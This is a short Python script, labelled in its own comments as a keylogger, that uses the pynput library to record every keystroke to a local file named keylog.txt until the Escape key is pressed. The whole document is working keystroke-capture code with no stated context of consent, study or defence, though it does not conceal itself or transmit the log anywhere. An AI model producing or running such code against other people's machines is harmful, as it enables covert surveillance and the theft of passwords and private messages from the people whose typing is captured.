from pynput.keyboard import Key, Listener

# Path to the log file
log_file = "keylog.txt"

# Function to write the key to the log file
def write_to_log(key):
    key_data = str(key)
    key_data = key_data.replace("'", "")

    with open(log_file, "a") as file:
        file.write(key_data)
        file.write("\n")

# Function to handle key press
def on_press(key):
    write_to_log(key)

# Function to handle key release
def on_release(key):
    if key == Key.esc:
        return False

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()